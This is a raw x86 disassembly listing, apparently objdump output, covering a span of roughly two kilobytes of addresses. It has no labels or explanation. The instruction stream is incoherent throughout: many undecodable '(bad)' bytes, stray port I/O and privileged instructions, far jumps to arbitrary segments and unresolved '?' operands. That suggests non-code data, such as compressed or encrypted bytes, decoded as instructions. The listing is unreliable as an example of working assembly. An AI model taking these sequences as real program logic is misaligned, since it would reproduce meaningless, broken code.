  41053b:	push   cx
  41053d:	sub    BYTE PTR [edx],ch
  41053f:	pop    ebx
  410540:	call   0xa8249d78
  410545:	push   eax
  410546:	fisubr DWORD PTR [ecx+0x51]
  410549:	mov    ds:0x3566b212,al
  41054e:	test   esi,0x7883c9d7
  410554:	jecxz  0x4104dc
  410556:	cli    
  410557:	mov    al,ds:0xa8949a4d
  41055c:	aaa    
  41055d:	push   ecx
  41055e:	clc    
  41055f:	pop    ebp
  410560:	dec    ebx
  410561:	(bad)  
  410562:	cld    
  410563:	sbb    DWORD PTR [edi],0x838c6135
  410569:	sub    BYTE PTR [esi-0x5296592b],bl
  41056f:	push   ds
  410570:	cmp    DWORD PTR [edi-0x1],ecx
  410573:	xchg   edi,eax
  410574:	sbb    eax,0x6e30e682
  410579:	or     dl,al
  41057b:	stc    
  41057c:	test   BYTE PTR [eax+0xb],bl
  41057f:	and    DWORD PTR [ecx+0x4b9a17fb],0x2a
  410586:	mov    ch,bl
  410588:	retf   
  410589:	xor    DWORD PTR [edx-0x3202075d],edx
  41058f:	cdq    
  410590:	mov    cl,0xb7
  410592:	test   BYTE PTR [esi+0x3a],al
  410595:	pop    ebp
  410596:	add    edi,DWORD PTR [eax+0x27]
  410599:	push   es
  41059a:	push   esp
  41059b:	sub    BYTE PTR [ebx],cl
  41059d:	(bad)  
  41059e:	shl    DWORD PTR [ecx],1
  4105a0:	test   al,0xda
  4105a2:	lods   al,BYTE PTR ds:[esi]
  4105a3:	mov    cl,0x1c
  4105a5:	push   esp
  4105a6:	inc    eax
  4105a7:	ins    BYTE PTR es:[edi],dx
  4105a8:	aad    0xe0
  4105aa:	call   FWORD PTR [esi]
  4105ac:	ins    DWORD PTR es:[edi],dx
  4105ad:	or     ch,ah
  4105af:	mov    ebp,0x34d6b0f9
  4105b4:	sbb    eax,0x5efff0c6
  4105b9:	or     eax,DWORD PTR [ecx]
  4105bb:	push   cs
  4105bc:	mov    edx,0xa9be5deb
  4105c1:	imul   ebp,DWORD PTR [ebp-0xa26a278],0xad4638c6
  4105cb:	or     al,0xb
  4105cd:	in     eax,0x3e
  4105cf:	retf   
  4105d0:	cs inc edx
  4105d2:	repnz pop edx
  4105d4:	fistp  WORD PTR [esp+esi*1]
  4105d7:	mov    cl,0xde
  4105d9:	in     eax,dx
  4105da:	sbb    DWORD PTR [ecx],0xffffffd2
  4105dd:	jmp    0x410595
  4105df:	xchg   ebp,eax
  4105e0:	inc    eax
  4105e1:	push   ss
  4105e2:	push   ecx
  4105e3:	push   es
  4105e4:	das    
  4105e5:	inc    ebp
  4105e6:	lds    ecx,FWORD PTR ss:[eax-0x52]
  4105ea:	rcr    BYTE PTR [edi],0x4
  4105ed:	imul   ebp,DWORD PTR [esi+0x68],0x4a
  4105f1:	cld    
  4105f2:	call   DWORD PTR [edx+edi*8]
  4105f5:	std    
  4105f6:	sbb    BYTE PTR ds:0x785f50d1,dh
  4105fc:	fsub   st(5),st
  4105fe:	aaa    
  4105ff:	push   ecx
  410600:	mov    ds:0xf2a2c129,al
  410605:	aaa    
  410606:	stc    
  410607:	dec    di
  410609:	add    ecx,0xffffff8d
  41060c:	cmp    esi,esi
  41060e:	or     BYTE PTR [ebx+0x28],al
  410611:	push   esp
  410612:	into   
  410613:	pop    ebp
  410614:	cmp    al,0xf0
  410616:	ja     0x41061f
  410618:	cdq    
  410619:	fstp   DWORD PTR [edi-0x62]
  41061c:	stos   BYTE PTR es:[edi],al
  41061d:	push   edx
  41061e:	arpl   WORD PTR [edi],bp
  410620:	adc    DWORD PTR [edi],0xffffffa6
  410623:	cmp    dh,ch
  410625:	and    eax,0x78e30ff9
  41062a:	call   0x32ffa30a
  41062f:	lods   al,BYTE PTR ds:[esi]
  410630:	sbb    BYTE PTR [ecx-0x153cafda],ah
  410636:	(bad)  
  410637:	cmp    dl,dl
  410639:	jbe    0x4105e0
  41063b:	mov    ?,WORD PTR [ebp-0x2b]
  41063e:	ss pop edx
  410640:	rol    DWORD PTR [ecx+0x2a0d631e],0x36
  410647:	int    0xd0
  410649:	pop    esp
  41064a:	(bad)  
  41064b:	adc    ecx,eax
  41064d:	cld    
  41064e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41064f:	mov    ds:0x2a00d4f6,eax
  410654:	(bad)  
  410655:	data16 mov ch,0xe1
  410658:	pop    es
  410659:	loop   0x41061f
  41065b:	cwde   
  41065c:	push   ds
  41065d:	pop    ebx
  41065e:	xchg   esp,eax
  41065f:	outs   dx,DWORD PTR ds:[esi]
  410660:	cld    
  410661:	fbld   TBYTE PTR ds:0x3ea1196a
  410667:	imul   ebp,DWORD PTR [ebp-0x37],0x4e
  41066b:	sbb    eax,0x29ee38f9
  410670:	and    DWORD PTR [ecx+0x646bf197],edx
  410676:	push   eax
  410677:	cs aaa 
  410679:	(bad)  
  41067a:	cmovbe ebx,DWORD PTR [ecx+0x32cafe9]
  410681:	add    al,0x6d
  410683:	cmp    al,0xc8
  410685:	xchg   edi,eax
  410686:	jns    0x4106b2
  410688:	clc    
  410689:	push   ds
  41068a:	jle    0x4106c9
  41068c:	inc    esi
  41068d:	jb     0x4106c1
  41068f:	mov    esi,0xa3588ed1
  410694:	push   edx
  410695:	out    dx,eax
  410696:	loopne 0x41069a
  410698:	gs xchg ebp,eax
  41069a:	sbb    ecx,DWORD PTR [esi]
  41069c:	adc    DWORD PTR [esi-0x1e],eax
  41069f:	outs   dx,DWORD PTR ds:[esi]
  4106a0:	jbe    0x41069b
  4106a2:	mov    fs,WORD PTR [edx]
  4106a4:	dec    ebp
  4106a5:	jo     0x410670
  4106a7:	stos   BYTE PTR es:[edi],al
  4106a8:	retf   
  4106a9:	push   esi
  4106aa:	les    ebx,FWORD PTR [edx]
  4106ac:	pop    ebp
  4106ad:	jbe    0x410673
  4106af:	retf   
  4106b0:	and    eax,0x9cb2f8e4
  4106b5:	sbb    eax,0x241c7357
  4106ba:	icebp  
  4106bb:	popa   
  4106bc:	adc    eax,0xa60e9194
  4106c1:	mov    DWORD PTR [edi+0x35],esp
  4106c4:	or     DWORD PTR [ecx+esi*4+0x262e3a7f],0x97a2de71
  4106cf:	jns    0x4106b2
  4106d1:	dec    edx
  4106d2:	retf   
  4106d3:	mov    ds:0x14b128a4,eax
  4106d8:	jb     0x41070b
  4106da:	and    edx,DWORD PTR [ebx]
  4106dc:	out    0x29,eax
  4106de:	xor    al,0x3c
  4106e0:	jae    0x410696
  4106e2:	jb     0x410723
  4106e4:	or     ecx,edi
  4106e6:	mov    esi,0xfba82a0
  4106eb:	jl     0x4106bb
  4106ed:	(bad)  
  4106ee:	test   BYTE PTR [edi+ebp*8+0x44d03f8f],ah
  4106f5:	pop    edx
  4106f6:	in     al,0xc5
  4106f8:	std    
  4106f9:	nop
  4106fa:	add    eax,0xc764aa84
  4106ff:	or     dh,dh
  410701:	aad    0x16
  410703:	pop    DWORD PTR [edi]
  410705:	mov    ebx,0xfff6b49b
  41070a:	adc    eax,0x2dc27e64
  41070f:	lock imul edx,DWORD PTR [edx-0x7f],0xc02fd3e8
  410717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410718:	add    BYTE PTR [edi-0x5],cl
  41071b:	pop    DWORD PTR [edx+0x70be2a01]
  410721:	ror    BYTE PTR [esp+eax*1-0x17072654],1
  410728:	imul   edx,DWORD PTR [esi],0x3309ac7c
  41072e:	jg     0x4106f4
  410730:	lds    eax,FWORD PTR [edx-0x29]
  410733:	ins    BYTE PTR es:[edi],dx
  410734:	sti    
  410735:	xchg   edx,eax
  410736:	push   ebx
  410737:	pop    ebx
  410738:	nop
  410739:	jecxz  0x410763
  41073b:	xor    al,0xad
  41073d:	leave  
  41073e:	outs   dx,BYTE PTR ds:[esi]
  41073f:	ins    DWORD PTR es:[edi],dx
  410740:	sbb    bh,dh
  410742:	jbe    0x4106ef
  410744:	mov    bh,0x28
  410746:	lods   al,BYTE PTR ds:[esi]
  410747:	mov    ah,cl
  410749:	and    BYTE PTR [ebx],0x66
  41074c:	push   eax
  41074d:	mov    bh,0x63
  41074f:	sahf   
  410750:	jo     0x41079c
  410752:	and    edx,DWORD PTR ds:0x4c64f988
  410758:	dec    esi
  410759:	jns    0x4107d8
  41075b:	mov    dl,0x7
  41075d:	add    DWORD PTR [eax],ebp
  41075f:	cld    
  410760:	(bad)  
  410761:	outs   dx,DWORD PTR ds:[esi]
  410762:	inc    esp
  410763:	mov    esi,0x3105ee43
  410768:	xchg   bh,cl
  41076a:	cs add eax,0x726156d3
  410770:	dec    esp
  410771:	pop    ss
  410772:	and    al,0xb3
  410774:	or     BYTE PTR [ebx+ebp*8],0xa4
  410778:	adc    cl,BYTE PTR [ecx-0x149d5203]
  41077e:	xchg   DWORD PTR [ebp-0x3d],esi
  410781:	icebp  
  410782:	adc    ebp,DWORD PTR [esp+eax*8+0x74]
  410786:	rol    DWORD PTR [edi-0x26db516a],0xb9
  41078d:	popa   
  41078e:	mov    ebx,0xad4b2c03
  410793:	das    
  410794:	push   ebx
  410795:	inc    esp
  410796:	xchg   esp,eax
  410797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410798:	cmp    ch,BYTE PTR [ecx-0x6b636568]
  41079e:	or     dh,0x79
  4107a1:	jns    0x4107ce
  4107a3:	aam    0x26
  4107a5:	jb     0x410764
  4107a7:	mov    eax,ds:0x179c737b
  4107ac:	pop    esi
  4107ad:	cmp    cl,BYTE PTR ss:[ebx+0x28eb4352]
  4107b4:	fisubr WORD PTR [edx-0x327bea22]
  4107ba:	xor    DWORD PTR [eax],ebp
  4107bc:	ss nop
  4107be:	lock xchg BYTE PTR [edx-0x70],ch
  4107c2:	cmp    esi,eax
  4107c4:	gs push ds
  4107c6:	pop    ecx
  4107c7:	cmp    bl,BYTE PTR [edi+0x1]
  4107ca:	mov    al,ds:0xb22b5c8e
  4107cf:	arpl   WORD PTR [ebx+0x1e5dd1c7],sp
  4107d5:	jb     0x410835
  4107d7:	and    al,0x2
  4107d9:	mov    ds:0x1c0c4005,al
  4107de:	inc    esi
  4107df:	call   ecx
  4107e1:	mov    ?,WORD PTR [ebp+edx*8-0x2b]
  4107e5:	lea    ebp,[esi]
  4107e7:	js     0x4107bf
  4107e9:	ret    
  4107ea:	sbb    BYTE PTR [eax-0x29],al
  4107ed:	repnz xchg esi,eax
  4107ef:	rcr    DWORD PTR [ebp+0x1dffea3c],0xde
  4107f6:	mov    BYTE PTR [edx*8-0x460cd17],dh
  4107fd:	jp     0x4107af
  4107ff:	xchg   BYTE PTR [ebx-0x64ec2561],ah
  410805:	rep outs dx,DWORD PTR ds:[esi]
  410807:	lds    edi,FWORD PTR [ebx-0x3293017f]
  41080d:	outs   dx,BYTE PTR ds:[esi]
  41080e:	jle    0x4107ae
  410810:	push   esi
  410811:	sub    ch,bl
  410813:	mov    cl,0x7f
  410815:	pop    ds
  410816:	mov    fs,WORD PTR [ecx+0x493a42f6]
  41081c:	xor    BYTE PTR [ecx+eax*1+0x16b7e56],ah
  410823:	and    BYTE PTR [esp+esi*4],al
  410826:	call   0x84bffdad
  41082b:	js     0x410800
  41082d:	cmp    eax,0xe3347290
  410832:	mov    ds:0xdd34efa5,eax
  410837:	jae    0x410815
  410839:	mov    eax,DWORD PTR [eax+0x4e]
  41083c:	push   0xffffffa8
  41083e:	fimul  WORD PTR [ebx-0x162dbdde]
  410844:	adc    eax,0xaefb379c
  410849:	test   eax,0x3ca95c91
  41084e:	ret    
  41084f:	in     al,dx
  410850:	xor    DWORD PTR [edx],ecx
  410852:	push   esp
  410853:	loopne 0x41089a
  410855:	mov    ecx,ebx
  410857:	inc    ebp
  410858:	cs addr16 pop edx
  41085b:	jb     0x410825
  41085d:	cmp    BYTE PTR ds:0xeda5a442,dh
  410863:	xor    cl,ah
  410865:	stos   BYTE PTR es:[edi],al
  410866:	aad    0xb8
  410868:	pop    ebp
  410869:	popa   
  41086a:	inc    edx
  41086b:	push   ss
  41086c:	dec    edx
  41086d:	adc    eax,0x554c431f
  410872:	xor    eax,0x61de6837
  410877:	add    eax,0x7b243ddd
  41087c:	pop    esp
  41087d:	shl    DWORD PTR [edi],1
  41087f:	outs   dx,BYTE PTR ds:[esi]
  410880:	out    0x6c,eax
  410882:	cs into 
  410884:	or     eax,eax
  410886:	pop    esp
  410887:	mov    eax,ds:0x81805fb1
  41088c:	mov    al,ds:0xe912a8ab
  410891:	scas   eax,DWORD PTR es:[edi]
  410892:	daa    
  410893:	jmp    0x62bd41d1
  410898:	and    DWORD PTR [ebx+0x5cd5c0ca],eax
  41089e:	push   esi
  41089f:	fnsave [eax]
  4108a1:	push   0x12e59f6d
  4108a6:	mov    esp,0xa070ce98
  4108ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ac:	pop    ds
  4108ad:	shl    ah,1
  4108af:	lahf   
  4108b0:	and    DWORD PTR [edx+0x24],edi
  4108b3:	add    eax,0xd758a7fe
  4108b8:	inc    esp
  4108b9:	push   ebp
  4108ba:	popf   
  4108bb:	or     al,0x22
  4108bd:	sub    bh,BYTE PTR [ebx-0x8]
  4108c0:	mov    cl,0x2b
  4108c2:	int3   
  4108c3:	js     0x4108aa
  4108c5:	dec    ebp
  4108c6:	jmp    0x5165:0xf51052f9
  4108cd:	sbb    eax,0x2f9788f9
  4108d2:	jbe    0x4108ab
  4108d4:	les    ebx,FWORD PTR [esi+0xd]
  4108d7:	repnz in eax,dx
  4108d9:	inc    eax
  4108da:	jmp    0x4108ca
  4108dc:	pop    ebp
  4108dd:	lds    eax,FWORD PTR [ebx+ecx*1-0x2a21e1b4]
  4108e4:	cmp    cl,BYTE PTR [edx]
  4108e6:	pop    eax
  4108e7:	or     al,ah
  4108e9:	gs adc eax,0x73cabb4a
  4108ef:	outs   dx,DWORD PTR ds:[esi]
  4108f0:	ret    0xf36a
  4108f3:	xor    al,0xf4
  4108f5:	and    al,0xdb
  4108f7:	jne    0x41087d
  4108f9:	(bad)  
  4108fa:	push   ss
  4108fb:	stc    
  4108fc:	add    ecx,DWORD PTR [eax]
  4108fe:	inc    ebx
  4108ff:	fadd   st,st(0)
  410901:	mov    cl,0x79
  410903:	nop
  410904:	icebp  
  410905:	out    dx,al
  410906:	rol    esp,0x7
  410909:	xchg   ebx,eax
  41090a:	jge    0x410943
  41090c:	jno    0x410912
  41090e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090f:	jo     0x41097c
  410911:	cmp    al,0x23
  410913:	aas    
  410914:	add    DWORD PTR [esi],ebp
  410916:	das    
  410917:	hlt    
  410918:	jp     0x4108b9
  41091a:	inc    esi
  41091b:	data16 aad 0xb4
  41091e:	add    DWORD PTR [ebp+ecx*4-0x2e70a50],esi
  410925:	xor    al,BYTE PTR [esi]
  410927:	cmc    
  410928:	(bad)  
  410929:	jmp    DWORD PTR [ecx]
  41092b:	call   FWORD PTR [ecx-0x2e5e20d5]
  410931:	sub    BYTE PTR [esp+eax*4],bh
  410934:	xchg   esi,eax
  410935:	aaa    
  410936:	mov    bl,0xb5
  410938:	xchg   DWORD PTR [edx],esi
  41093a:	xchg   BYTE PTR [ebx+0x304711c2],ch
  410940:	cmp    eax,0xeea67817
  410945:	push   0x5a3afcea
  41094a:	lock call 0xaa605cfd
  410950:	lods   al,BYTE PTR ds:[esi]
  410951:	pop    ecx
  410952:	mov    ecx,0x5c1789d6
  410957:	mov    ds:0x23270167,al
  41095c:	pop    eax
  41095d:	cmp    BYTE PTR ds:0x63ff7ab7,bh
  410963:	imul   edi,DWORD PTR [ecx+0x330e9573],0x13c1ad8e
  41096d:	sti    
  41096e:	pop    edx
  41096f:	leave  
  410970:	jl     0x41091f
  410972:	sbb    BYTE PTR [esi+edx*2+0x68382b2],bh
  410979:	add    cl,BYTE PTR [ebp+ebp*1-0xc22cdf1]
  410980:	pop    esi
  410981:	pop    es
  410982:	repz pop es
  410984:	or     ebx,DWORD PTR [edx+0x3cd7ab56]
  41098a:	outs   dx,BYTE PTR ds:[esi]
  41098b:	jmp    0x201ad2ab
  410990:	xchg   ebp,eax
  410991:	call   0x95438d92
  410996:	pop    ebx
  410997:	test   al,0x8e
  410999:	add    dl,BYTE PTR ds:0xadb9120b
  41099f:	push   eax
  4109a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109a1:	or     bl,BYTE PTR [ebx]
  4109a3:	mov    eax,ds:0x8b40ea0
  4109a8:	adc    DWORD PTR [eax],ebx
  4109aa:	push   0xffffffd6
  4109ac:	je     0x4109ef
  4109ae:	scas   eax,DWORD PTR es:[edi]
  4109af:	push   esi
  4109b0:	sub    al,cl
  4109b2:	das    
  4109b3:	popa   
  4109b4:	fnstenv ds:0x403c856b
  4109ba:	jb     0x41094e
  4109bc:	mov    ebp,0x7472b29a
  4109c1:	and    BYTE PTR [eax-0x1c],dh
  4109c4:	into   
  4109c5:	es clc 
  4109c7:	add    eax,0x4188a437
  4109cc:	stc    
  4109cd:	pop    esp
  4109ce:	pop    ebp
  4109cf:	dec    ebx
  4109d0:	imul   esp,DWORD PTR [ecx-0x17ad9117],0xffffff96
  4109d7:	mov    eax,0x932d8ea
  4109dc:	lock inc ebx
  4109de:	sar    BYTE PTR [edi+0x398f277d],1
  4109e4:	(bad)  
  4109e6:	jl     0x41097c
  4109e8:	jno    0x4109d6
  4109ea:	aam    0xf8
  4109ec:	fcomip st,st(2)
  4109ee:	dec    esi
  4109ef:	test   DWORD PTR [ecx+ebx*8+0x4458c81a],ecx
  4109f6:	(bad)  
  4109f8:	push   0xb295aafb
  4109fd:	ds dec esp
  4109ff:	call   0xc85:0x866ecc39
  410a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a07:	imul   eax,DWORD PTR [esi+0x65ac63d1],0xf8ec0f9
  410a11:	fbstp  TBYTE PTR [edx+0x4cad5e00]
  410a17:	pop    ds
  410a18:	cmp    al,0x2
  410a1a:	mov    ah,0x28
  410a1c:	mov    esi,0x6d452f74
  410a21:	xchg   DWORD PTR [ebx+0x5b],edx
  410a24:	aam    0x83
  410a26:	test   eax,0xa5f108c7
  410a2b:	imul   eax,eax,0xffffffc9
  410a2e:	mov    ch,BYTE PTR [edi-0x11]
  410a31:	mov    eax,ds:0x3d867d82
  410a36:	bound  eax,QWORD PTR [edi-0x70f16d95]
  410a3c:	mov    al,0xcd
  410a3e:	sbb    DWORD PTR [esi+0x75],eax
  410a41:	jns    0x410a88
  410a43:	push   ss
  410a44:	call   0x12031260
  410a49:	stos   DWORD PTR es:[edi],eax
  410a4a:	mov    al,0x7b
  410a4c:	aas    
  410a4d:	xor    BYTE PTR [esi+0x7a],cl
  410a50:	and    eax,DWORD PTR [ecx+eiz*8]
  410a53:	mov    al,ds:0x73325c8b
  410a58:	push   es
  410a59:	cmp    DWORD PTR [esi],ebx
  410a5b:	and    BYTE PTR [edi-0x7c7e8d28],cl
  410a61:	sar    BYTE PTR [ecx-0x64],cl
  410a64:	add    DWORD PTR [ebx+0x3a],0x6b
  410a68:	mov    ecx,0x5b115de7
  410a6d:	mov    edx,0xcef1b637
  410a72:	sbb    ebp,ebx
  410a74:	sbb    dh,BYTE PTR [edi]
  410a76:	xor    edi,DWORD PTR [ebx]
  410a78:	sbb    BYTE PTR [ebx-0x1ede59cb],0x36
  410a7f:	xchg   ecx,eax
  410a80:	inc    esi
  410a81:	and    cl,BYTE PTR [ebx-0x73971cf5]
  410a87:	xor    eax,0xe6e830e
  410a8c:	push   edi
  410a8d:	push   ss
  410a8e:	add    dh,BYTE PTR [ecx-0x43]
  410a91:	or     esi,DWORD PTR [ecx+edi*2+0x54]
  410a95:	lahf   
  410a96:	jo     0x410a24
  410a98:	and    cl,BYTE PTR [eax-0x791fb19]
  410a9e:	lea    eax,[ebp-0x67]
  410aa1:	and    eax,0xc8e0dfc4
  410aa6:	sub    bl,dh
  410aa8:	sbb    eax,0x52c158f6
  410aad:	sub    eax,0xd5ede5ad
  410ab2:	pop    esi
  410ab3:	inc    ebx
  410ab4:	mov    DWORD PTR [ecx],0x5f9e996f
  410aba:	je     0x410aaa
  410abc:	popf   
  410abd:	mov    edi,0xc0cb6f47
  410ac2:	enter  0xba20,0x17
  410ac6:	stos   DWORD PTR es:[edi],eax
  410ac7:	(bad)  
  410ac8:	mov    edx,0x1b902f1d
  410acd:	sti    
  410ace:	pop    ss
  410acf:	jl     0x410b4d
  410ad1:	pop    ebx
  410ad2:	inc    edx
  410ad3:	lahf   
  410ad4:	ins    BYTE PTR es:[edi],dx
  410ad5:	xor    al,0x25
  410ad7:	jmp    0x410acb
  410ad9:	xor    eax,DWORD PTR [ebp+0x15]
  410adc:	inc    eax
  410add:	and    BYTE PTR [edi],bl
  410adf:	repz neg DWORD PTR [ebx+eiz*8]
  410ae3:	xchg   esp,eax
  410ae4:	das    
  410ae5:	jg     0x410b2b
  410ae7:	call   0x95f7:0xc94d4e31
  410aee:	cmp    al,0xcb
  410af0:	call   0x89d8:0x8704481f
  410af7:	mov    bl,0x77
  410af9:	sbb    eax,0x20aa69b0
  410afe:	push   ebp
  410aff:	scas   al,BYTE PTR es:[edi]
  410b00:	mov    edx,0x65120735
  410b05:	mov    al,0xc7
  410b07:	mov    bl,0x50
  410b09:	fstp   DWORD PTR [ecx-0x20b59aa]
  410b0f:	jle    0x410a96
  410b11:	jae    0x410ab7
  410b13:	or     eax,0xd8ec60d3
  410b18:	mov    ah,0xec
  410b1a:	xor    ah,BYTE PTR [edx+0x61991e18]
  410b20:	outs   dx,DWORD PTR ds:[esi]
  410b21:	sti    
  410b22:	jb     0x410af6
  410b24:	int3   
  410b25:	into   
  410b26:	push   esi
  410b27:	hlt    
  410b28:	sub    BYTE PTR [ebx+0xa015b5f],dl
  410b2e:	push   ebp
  410b2f:	adc    DWORD PTR [eax],eax
  410b31:	sbb    DWORD PTR [ebx],esp
  410b33:	dec    edi
  410b34:	in     eax,0xb6
  410b36:	mov    ds:0x51770df3,al
  410b3b:	push   ss
  410b3c:	test   DWORD PTR ds:0x84279a4b,esp
  410b42:	out    0xcf,eax
  410b44:	mov    bh,0x99
  410b46:	(bad)  
  410b47:	pushf  
  410b48:	and    DWORD PTR [ecx+0x4e],0x15
  410b4c:	push   ebx
  410b4d:	mov    esi,?
  410b4f:	pop    esi
  410b50:	fidiv  WORD PTR [edx+0x7d]
  410b53:	enter  0x374e,0x39
  410b57:	jns    0x410bc3
  410b59:	inc    edi
  410b5a:	mov    eax,ds:0xb56e7c67
  410b5f:	ins    DWORD PTR es:[edi],dx
  410b60:	jno    0x410b71
  410b62:	out    0xae,al
  410b64:	dec    ebp
  410b65:	pop    ebx
  410b66:	mov    al,ds:0xecf8a02a
  410b6b:	data16 sbb al,0x51
  410b6e:	inc    ebx
  410b6f:	push   esp
  410b70:	dec    ecx
  410b71:	out    0x5d,eax
  410b73:	sub    al,0x96
  410b75:	aaa    
  410b76:	icebp  
  410b77:	mov    ds:0xfd443d5f,eax
  410b7c:	retf   
  410b7d:	adc    al,0x95
  410b7f:	fisttp WORD PTR [esp+edx*1-0x4f]
  410b83:	das    
  410b84:	ror    DWORD PTR [edi-0x12885e84],cl
  410b8a:	adc    BYTE PTR [edx+0x1b],0x29
  410b8e:	cmp    dl,BYTE PTR [esi+0x7abe3dee]
  410b94:	fwait
  410b95:	cmp    BYTE PTR [esi+esi*4],ch
  410b98:	mov    al,ds:0x8d619d2b
  410b9d:	(bad)  
  410b9e:	jp     0x410b42
  410ba0:	ror    BYTE PTR [ecx],1
  410ba2:	push   edx
  410ba3:	bound  ebp,QWORD PTR [ebx]
  410ba5:	or     edi,DWORD PTR [edi-0x26]
  410ba8:	dec    esi
  410ba9:	std    
  410baa:	fucomp st(2)
  410bac:	cmp    DWORD PTR [ebp-0x4b],edi
  410baf:	mov    cl,BYTE PTR [edi+0x78]
  410bb2:	shr    DWORD PTR [edi],1
  410bb4:	inc    ebp
  410bb5:	cwde   
  410bb6:	jmp    0x33d9:0xbaa5dfdb
  410bbd:	pushf  
  410bbe:	dec    ebp
  410bbf:	push   ebx
  410bc0:	aad    0xd2
  410bc2:	jo     0x410c28
  410bc4:	fsubp  st(5),st
  410bc6:	rcr    BYTE PTR [esi-0x26],cl
  410bc9:	fcmovnbe st,st(0)
  410bcb:	or     eax,0x496c131b
  410bd0:	jmp    0x1ee9d79c
  410bd5:	in     al,0x89
  410bd7:	push   0x88d92a67
  410bdc:	mov    ebx,0xb21f3d89
  410be1:	daa    
  410be2:	loopne 0x410c54
  410be4:	sbb    ebx,DWORD PTR [edx-0x8]
  410be7:	call   DWORD PTR [esi]
  410be9:	aad    0xed
  410beb:	xchg   ebp,eax
  410bec:	sbb    al,0xd3
  410bee:	mov    eax,ds:0x39341e7e
  410bf3:	xchg   edi,eax
  410bf4:	out    dx,al
  410bf5:	adc    DWORD PTR [edx],ebp
  410bf7:	push   ss
  410bf8:	int3   
  410bf9:	lock jo 0x410c30
  410bfc:	push   ebp
  410bfd:	sbb    eax,0x328ee639
  410c02:	aas    
  410c03:	jnp    0x410c46
  410c05:	mov    WORD PTR [edx-0x3c],ds
  410c08:	pop    edi
  410c09:	iret   
  410c0a:	pop    edi
  410c0b:	dec    esi
  410c0c:	icebp  
  410c0d:	sbb    dl,BYTE PTR [edi-0x385af26b]
  410c13:	enter  0x9e52,0x57
  410c17:	int    0xbd
  410c19:	cmp    bl,BYTE PTR [edi+0x69]
  410c1c:	jp     0x410c16
  410c1e:	(bad)  
  410c1f:	enter  0x1cfb,0x8
  410c23:	icebp  
  410c24:	xor    DWORD PTR [ecx+0x4abe3dd9],0x387078a7
  410c2e:	stos   BYTE PTR es:[edi],al
  410c2f:	scas   eax,DWORD PTR es:[edi]
  410c30:	sbb    esp,DWORD PTR [ebp+0x77b06bfa]
  410c36:	pushf  
  410c37:	leave  
  410c38:	mov    eax,DWORD PTR [esi*4+0x76e7dc48]
  410c3f:	cmp    BYTE PTR [edx-0xa31f3c8],dl
  410c45:	cdq    
  410c46:	aas    
  410c47:	fild   DWORD PTR [edi+eiz*2]
  410c4a:	jp     0x410c59
  410c4c:	xchg   esp,eax
  410c4d:	inc    ebp
  410c4e:	inc    ebp
  410c4f:	fwait
  410c50:	mov    BYTE PTR [esi],bl
  410c52:	adc    BYTE PTR [ebx],cl
  410c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c55:	cmp    ch,BYTE PTR [esi+ecx*8-0x55]
  410c59:	mov    ebx,0x5ebc0dde
  410c5e:	jno    0x410c82
  410c60:	(bad)  
  410c61:	js     0x410c2c
  410c63:	dec    ebx
  410c64:	(bad)  
  410c65:	out    0x5b,al
  410c67:	mov    bl,BYTE PTR [ebp+0x5628dc0a]
  410c6d:	jae    0x410c37
  410c6f:	push   cs
  410c70:	aam    0x18
  410c72:	icebp  
  410c73:	dec    esp
  410c74:	xor    BYTE PTR [edx],bh
  410c76:	push   esi
  410c77:	imul   ecx,ebx,0xffffffb5
  410c7a:	daa    
  410c7b:	in     eax,dx
  410c7c:	jbe    0x410cb7
  410c7e:	fcmovu st,st(5)
  410c80:	cmp    eax,0xddd139b3
  410c85:	pop    eax
  410c86:	cli    
  410c87:	lea    ecx,[esi-0x331fd5e]
  410c8d:	sub    ebx,edx
  410c8f:	cmc    
  410c90:	cwde   
  410c91:	sub    esi,DWORD PTR [edi]
  410c93:	pop    ecx
  410c94:	(bad)
  410c97:	(bad)  
  410c98:	sbb    al,0x88
  410c9a:	mov    ecx,0xd418bf42
  410c9f:	sbb    al,0x3a
  410ca1:	hlt    
  410ca2:	adc    eax,eax
  410ca4:	xchg   edi,eax
  410ca5:	out    0x87,al
  410ca7:	sub    ebx,DWORD PTR [edx+0x53]
  410caa:	leave  
  410cab:	push   esi
  410cac:	jne    0x410c6d
  410cae:	push   0xbf041ce2
  410cb3:	xor    al,0xd5
  410cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb6:	xor    ecx,DWORD PTR [ebx]
  410cb8:	pop    eax
  410cb9:	loopne 0x410d08
  410cbb:	lock mov WORD PTR [esp+ecx*2-0x5ced7eb9],es
  410cc3:	shl    edx,1
  410cc5:	push   cs
  410cc6:	adc    BYTE PTR ds:0xba04360c,cl
  410ccc:	sbb    al,0x63
  410cce:	push   es
  410ccf:	add    dh,BYTE PTR [ecx+0xe6b17d8]
  410cd5:	aaa    
  410cd6:	add    al,0x36
  410cd8:	cwde   
  410cd9:	stc    
  410cda:	adc    BYTE PTR [edi],cl
  410cdc:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  410cde:	adc    edx,DWORD PTR [ebp+eiz*8+0x7e3721bc]
  410ce5:	shr    edi,0xca
  410ce8:	aam    0x7e
  410cea:	(bad)  
  410ceb:	in     eax,0x5d
  410ced:	out    0xd3,al
  410cef:	xor    ebp,DWORD PTR ds:0x7e12cccd
  410cf5:	ins    DWORD PTR es:[edi],dx
  410cf6:	mov    ebx,0x27848d1f
  410cfb:	hlt    
  410cfc:	add    al,BYTE PTR [eax+eiz*2]
  410cff:	call   0xee72e92
  410d04:	in     eax,0x37
  410d06:	sar    DWORD PTR [edx+0x55],cl
  410d09:	stc    
  410d0a:	test   BYTE PTR [edi+0x35c600a5],dh
  410d10:	les    eax,FWORD PTR [eax+0x25]
  410d13:	pop    ebx
  410d14:	or     ah,BYTE PTR [eax-0x53598de8]
  410d1a:	or     al,0xe1
  410d1c:	ja     0x410d86
  410d1e:	jmp    0x410d40
  410d20:	or     eax,0xca3df6bc
  410d25:	mov    bh,0x53
  410d27:	test   DWORD PTR [edi+edi*2-0x19b4b27e],0xfaef2aed
  410d32:	(bad)  
  410d33:	jmp    0x410d50
  410d35:	inc    esi
  410d36:	ret    
